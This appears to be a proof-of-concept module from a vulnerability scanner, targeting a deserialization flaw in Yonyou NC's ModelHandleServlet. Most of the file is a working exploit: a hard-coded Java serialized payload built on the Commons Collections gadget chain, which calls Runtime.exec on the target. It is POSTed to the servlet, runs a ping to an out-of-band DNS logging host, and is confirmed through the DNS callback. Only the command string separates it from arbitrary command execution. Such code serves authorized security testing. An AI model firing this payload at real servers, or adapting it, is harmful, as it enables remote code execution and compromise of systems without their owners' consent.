'''
Function:
    用友 NC ModelHandleServlet 反序列化漏洞
Author:
    花果山
Wechat official account：
    中龙 红客突击队
Official website：
    https://www.hscsec.cn/
Email：
    spmonkey@hscsec.cn
Blog:
    https://spmonkey.github.io/
GitHub:
    https://github.com/spmonkey/
'''
# -*- coding: utf-8 -*-
import requests
import os
import sys
from urllib.parse import urlparse
from requests.packages.urllib3 import disable_warnings
disable_warnings()
path = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.append(path)
from modules.dnslogs import dnslogs
from modules import get_user_agent


class poc:
    def __init__(self, url, proxies):
        self.url = url
        self.headers = {
            'User-Agent': get_user_agent.get_user_agent(),
            'Content-Type': 'application/octet-stream'
        }
        self.value_list = []
        self.result_text = ""
        self.proxies = proxies

    def host(self):
        url = urlparse(self.url)
        netloc = url.netloc
        scheme = url.scheme
        return netloc, scheme

    def vuln(self, netloc, scheme):
        try:
            dnslog_all = dnslogs(self.proxies).get_dnslog()
            dnslog = dnslog_all[0]
            url = "{}://{}/servlet/~aert/uap.pub.ae.model.handle.ModelHandleServlet".format(scheme, netloc)
            data = '\xac\xed\x00\x05sr\x00\x11java.util.HashSet\xbaD\x85\x95\x96\xb8\xb74\x03\x00\x00xpw\x0c\x00\x00\x00\x02?@\x00\x00\x00\x00\x00\x01sr\x004org.apache.commons.collections.keyvalue.TiedMapEntry\x8a\xad\xd2\x9b9\xc1\x1f\xdb\x02\x00\x02L\x00\x03keyt\x00\x12Ljava/lang/Object;L\x00\x03mapt\x00\x0fLjava/util/Map;xpt\x00\x03foosr\x00*org.apache.commons.collections.map.LazyMapn\xe5\x94\x82\x9ey\x10\x94\x03\x00\x01L\x00\x07factoryt\x00,Lorg/apache/commons/collections/Transformer;xpsr\x00:org.apache.commons.collections.functors.ChainedTransformer0\xc7\x97\xec(z\x97\x04\x02\x00\x01[\x00\riTransformerst\x00-[Lorg/apache/commons/collections/Transformer;xpur\x00-[Lorg.apache.commons.collections.Transformer;\xbdV*\xf1\xd84\x18\x99\x02\x00\x00xp\x00\x00\x00\x05sr\x00;org.apache.commons.collections.functors.ConstantTransformerXv\x90\x11A\x02\xb1\x94\x02\x00\x01L\x00\tiConstantq\x00~\x00\x03xpvr\x00\x11java.lang.Runtime\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00xpsr\x00:org.apache.commons.collections.functors.InvokerTransformer\x87\xe8\xffk{|\xce8\x02\x00\x03[\x00\x05iArgst\x00\x13[Ljava/lang/Object;L\x00\x0biMethodNamet\x00\x12Ljava/lang/String;[\x00\x0biParamTypest\x00\x12[Ljava/lang/Class;xpur\x00\x13[Ljava.lang.Object;\x90\xceX\x9f\x10s)l\x02\x00\x00xp\x00\x00\x00\x02t\x00\ngetRuntimeur\x00\x12[Ljava.lang.Class;\xab\x16\xd7\xae\xcb\xcdZ\x99\x02\x00\x00xp\x00\x00\x00\x00t\x00\tgetMethoduq\x00~\x00\x1b\x00\x00\x00\x02vr\x00\x10java.lang.String\xa0\xf0\xa48z;\xb3B\x02\x00\x00xpvq\x00~\x00\x1bsq\x00~\x00\x13uq\x00~\x00\x18\x00\x00\x00\x02puq\x00~\x00\x18\x00\x00\x00\x00t\x00\x06invokeuq\x00~\x00\x1b\x00\x00\x00\x02vr\x00\x10java.lang.Object\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00xpvq\x00~\x00\x18sq\x00~\x00\x13ur\x00\x13[Ljava.lang.String;\xad\xd2V\xe7\xe9\x1d{G\x02\x00\x00xp\x00\x00\x00\x01t\x00\x15ping -c 4 '+ dnslog +'t\x00\x04execuq\x00~\x00\x1b\x00\x00\x00\x01q\x00~\x00 sq\x00~\x00\x0fsr\x00\x11java.lang.Integer\x12\xe2\xa0\xa4\xf7\x81\x878\x02\x00\x01I\x00\x05valuexr\x00\x10java.lang.Number\x86\xac\x95\x1d\x0b\x94\xe0\x8b\x02\x00\x00xp\x00\x00\x00\x01sr\x00\x11java.util.HashMap\x05\x07\xda\xc1\xc3\x16`\xd1\x03\x00\x02F\x00\nloadFactorI\x00\tthresholdxp?@\x00\x00\x00\x00\x00\x00w\x08\x00\x00\x00\x10\x00\x00\x00\x00xxx'
            result = requests.post(url=url, data=data, headers=self.headers, proxies=self.proxies, verify=False)
            for i in range(5):
                dnslog_result = dnslogs(self.proxies).get_result(dnslog_all[1])
            if dnslog_result != "[]":
                target = urlparse(url)
                self.result_text += """\n        [+]    \033[32m检测到目标站点存在反序列化漏洞\033[0m
                 POST {} HTTP/1.1
                 Host: {}""".format(target.path, target.netloc)
                for request_type, request_text in dict(result.request.headers).items():
                    self.result_text += "\n                 {}: {}".format(request_type, request_text)
                self.result_text += "\n\n                 {}".format(data)
                return True
            else:
                return False
        except:
            return False

    def main(self):
        all = self.host()
        netloc = all[0]
        scheme = all[1]
        if self.vuln(netloc, scheme):
             return self.result_text
        else:
            return False


